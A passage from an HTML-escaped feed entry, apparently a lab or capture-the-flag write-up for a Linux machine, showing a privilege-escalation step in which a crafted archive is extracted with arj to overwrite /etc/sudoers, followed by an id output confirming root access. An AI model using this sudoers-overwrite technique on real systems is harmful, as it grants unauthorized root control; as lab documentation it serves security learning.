    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj e &lt;span class=&quot;s2&quot;&gt;&quot;sudoers.arj&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/etc&quot;&lt;/span&gt;
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Processing archive: sudoers.arj
Archive created: 2021-07-22 18:12:43, modified: 2021-07-22 18:12:43
ARJ        704 21-07-22 18:12:24, DISK        669 20-02-02 02:41:42
/etc/sudoers               exists, Overwrite? y
Extracting sudoers                    to /etc/sudoers                OK        
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Successful exploit will grant us permission to execute &lt;strong&gt;any&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command under the root privilege without providing any password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@g00g:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="pg" /><category term="goog" /><category term="linux" /><summary type="html">Summary of Result</summary></entry></feed>